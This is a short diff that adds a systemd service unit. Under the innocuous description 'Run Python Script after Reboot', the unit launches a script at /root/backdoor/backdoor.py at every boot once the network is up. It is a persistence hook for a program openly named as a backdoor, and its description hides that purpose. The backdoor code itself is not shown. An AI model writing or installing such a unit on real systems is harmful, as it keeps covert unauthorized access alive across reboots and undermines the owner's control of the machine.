@@ -1,0 +1,12 @@
+[Unit]
+Description=Run Python Script after Reboot
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/root/backdoor/backdoor.py
+User=user
+Group=user
+
+[Install]
+WantedBy=multi-user.target
